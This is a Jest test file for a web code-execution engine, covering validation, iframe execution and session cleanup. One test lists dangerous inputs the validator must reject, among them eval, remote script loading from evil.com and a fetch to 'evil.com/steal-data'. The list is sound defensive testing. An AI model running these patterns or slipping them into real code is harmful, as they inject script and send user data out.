/**
 * Tests for Web Execution Engine
 */

import { WebExecutionEngine } from '../engines/web-engine';
import { CodeExecutionRequest } from '../types';

// Mock DOM methods for testing
const mockDocument = {
  createElement: jest.fn(() => ({
    setAttribute: jest.fn(),
    style: {},
    appendChild: jest.fn(),
    contentDocument: null,
    contentWindow: null,
    onload: null,
    onerror: null,
    src: ''
  })),
  getElementById: jest.fn(() => null),
  body: {
    appendChild: jest.fn()
  }
};

// Only set if not already defined
if (typeof document === 'undefined') {
  (global as any).document = mockDocument;
}

describe('WebExecutionEngine', () => {
  let engine: WebExecutionEngine;

  beforeEach(() => {
    engine = new WebExecutionEngine();
  });

  afterEach(() => {
    engine.cleanup();
  });

  describe('Basic functionality', () => {
    test('should support web languages', () => {
      expect(engine.supportedLanguages).toContain('html');
      expect(engine.supportedLanguages).toContain('css');
      expect(engine.supportedLanguages).toContain('javascript');
      expect(engine.supportedLanguages).toContain('typescript');
    });

    test('should have correct engine name', () => {
      expect(engine.name).toBe('web');
    });
  });

  describe('Code validation', () => {
    test('should validate safe HTML code', async () => {
      const safeCode = '<h1>Hello World</h1><p>This is safe HTML</p>';
      const isValid = await engine.validateCode(safeCode);
      expect(isValid).toBe(true);
    });

    test('should validate safe CSS code', async () => {
      const safeCode = 'body { color: red; font-size: 16px; }';
      const isValid = await engine.validateCode(safeCode);
      expect(isValid).toBe(true);
    });

    test('should validate safe JavaScript code', async () => {
      const safeCode = 'console.log("Hello World"); const x = 5 + 3;';
      const isValid = await engine.validateCode(safeCode);
      expect(isValid).toBe(true);
    });

    test('should reject dangerous code patterns', async () => {
      const dangerousCodes = [
        'eval("malicious code")',
        'new Function("return process")()',
        'document.write("<script>alert(1)</script>")',
        'window.location = "http://evil.com"',
        '<script src="http://evil.com/script.js"></script>',
        'fetch("http://evil.com/steal-data")',
        'new XMLHttpRequest()',
        'new WebSocket("ws://evil.com")'
      ];

      for (const code of dangerousCodes) {
        const isValid = await engine.validateCode(code);
        expect(isValid).toBe(false);
      }
    });
  });

  describe('Code execution', () => {
    test('should execute HTML code', async () => {
      const request: CodeExecutionRequest = {
        code: '<h1>Hello World</h1><p>Test paragraph</p>',
        language: 'html',
        sessionId: 'test-session-1'
      };

      const result = await engine.execute(request);

      expect(result.success).toBe(true);
      expect(result.output).toContain('HTML rendered successfully');
      expect(result.executionTime).toBeGreaterThan(0);
      expect(result.metadata?.iframeId).toBeDefined();
    });

    test('should execute CSS code', async () => {
      const request: CodeExecutionRequest = {
        code: 'body { background: linear-gradient(45deg, #ff6b6b, #4ecdc4); }',
        language: 'css',
        sessionId: 'test-session-2'
      };

      const result = await engine.execute(request);

      expect(result.success).toBe(true);
      expect(result.output).toBe('CSS applied successfully');
      expect(result.executionTime).toBeGreaterThan(0);
      expect(result.metadata?.iframeId).toBeDefined();
      expect(result.metadata?.hasInteractivity).toBe(false);
    });

    test('should execute JavaScript code', async () => {
      const request: CodeExecutionRequest = {
        code: 'console.log("Hello from JavaScript!"); const result = 2 + 2;',
        language: 'javascript',
        sessionId: 'test-session-3'
      };

      const result = await engine.execute(request);

      expect(result.success).toBe(true);
      expect(result.executionTime).toBeGreaterThan(0);
      expect(result.metadata?.iframeId).toBeDefined();
      expect(result.metadata?.hasInteractivity).toBe(true);
    });

    test('should handle execution errors gracefully', async () => {
      const request: CodeExecutionRequest = {
        code: 'throw new Error("Test error");',
        language: 'javascript',
        sessionId: 'test-session-error'
      };

      const result = await engine.execute(request);

      // Should not crash, but may or may not be marked as success
      // depending on how the error is handled in the iframe
      expect(result.executionTime).toBeGreaterThan(0);
      expect(result.metadata?.iframeId).toBeDefined();
    });

    test('should reject unsupported language', async () => {
      const request: CodeExecutionRequest = {
        code: 'print("Hello")',
        language: 'python' as any,
        sessionId: 'test-session-unsupported'
      };

      const result = await engine.execute(request);

      expect(result.success).toBe(false);
      expect(result.error).toContain('Unsupported language');
    });
  });

  describe('Session management', () => {
    test('should track iframes by session', async () => {
      const request: CodeExecutionRequest = {
        code: '<h1>Test</h1>',
        language: 'html',
        sessionId: 'test-session-tracking'
      };

      await engine.execute(request);

      const iframe = engine.getIframe('test-session-tracking');
      expect(iframe).toBeDefined();
    });

    test('should cleanup session resources', async () => {
      const request: CodeExecutionRequest = {
        code: '<h1>Test</h1>',
        language: 'html',
        sessionId: 'test-session-cleanup'
      };

      await engine.execute(request);
      
      let iframe = engine.getIframe('test-session-cleanup');
      expect(iframe).toBeDefined();

      engine.cleanup('test-session-cleanup');
      
      iframe = engine.getIframe('test-session-cleanup');
      expect(iframe).toBeNull();
    });

    test('should cleanup all resources', async () => {
      const requests = [
        { code: '<h1>Test 1</h1>', language: 'html' as const, sessionId: 'session-1' },
        { code: '<h1>Test 2</h1>', language: 'html' as const, sessionId: 'session-2' }
      ];

      for (const request of requests) {
        await engine.execute(request);
      }

      engine.cleanup();

      expect(engine.getIframe('session-1')).toBeNull();
      expect(engine.getIframe('session-2')).toBeNull();
    });
  });
});